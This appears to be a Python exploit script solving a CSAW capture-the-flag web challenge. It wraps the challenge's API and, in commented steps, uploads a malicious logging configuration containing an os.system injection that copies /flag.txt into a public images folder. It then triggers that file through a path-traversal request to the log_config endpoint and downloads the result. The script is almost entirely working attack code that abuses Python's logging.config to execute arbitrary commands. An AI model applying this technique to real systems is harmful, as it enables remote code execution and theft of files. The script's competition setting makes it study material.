import requests
import json

URL = "http://web.chal.csaw.io:5012"


class API:
    def __init__(self, url=URL):
        self.requests = requests.Session()
        self.url = url

    def login(self, username, password):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/login',
            json={
                'username': username,
                'password': password,
            }
        )
        return req.text

    def register(self, username, password):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/register',
            json={
                'username': username,
                'password': password,
            }
        )
        return req.text

    def gallery(self):
        r = self.requests
        url = self.url
        req = r.get(
            f'{url}/api/gallery',
        )
        return req.text

    def download_image(self, file):
        r = self.requests
        url = self.url
        req = r.get(
            f'{url}/api/download_image',
            params={
                'file': file,
            }
        )
        return req.text

    def upload(self, file, filename):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/upload',
            files={
                'file': open(file, 'rb')
            },
            data={
                'label': filename
            }
        )
        return req.text

    def log_config(self, filename):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/log_config',
            json={
                'filename': filename,
            },
        )
        return req.text

    def run_command(self, command):
        r = self.requests
        url = self.url
        req = r.post(
            f'{url}/api/run_command',
            json={
                'filename': command,
            },
        )
        return req.text

a = API()

user = 'dimas123'

# step 1
# print(a.register(user, 'dimas123'))
# print(a.login(user, 'dimas123'))
# print(a.upload(file='empty', filename='flag.txt'))
# flag_txt = json.loads(a.gallery())['message'][0]
# print(flag_txt)

# step 2: change the directory in attacker.conf with flag_txt
'''
class=__import__('os').system('cat /flag.txt > /app/application/static/images/{change here}')
'''

# step 3
# print(a.login(user, 'dimas123'))
# print(a.upload(file='attacker.conf', filename='attacker.conf'))
# mal_conf = json.loads(a.gallery())['message'][1]
# print(mal_conf)

# step 4
# print(a.login(user, 'dimas123'))
# mal_conf = json.loads(a.gallery())['message'][1]
# flag_txt = json.loads(a.gallery())['message'][0]
# print(a.log_config(filename=f"../images/{mal_conf}"))
# print(a.download_image(file=f"{flag_txt}"))

'''
# Refenrence: 
https://github.com/raj3shp/python-logging.config-exploit
https://docs.python.org/3/library/logging.config.html
'''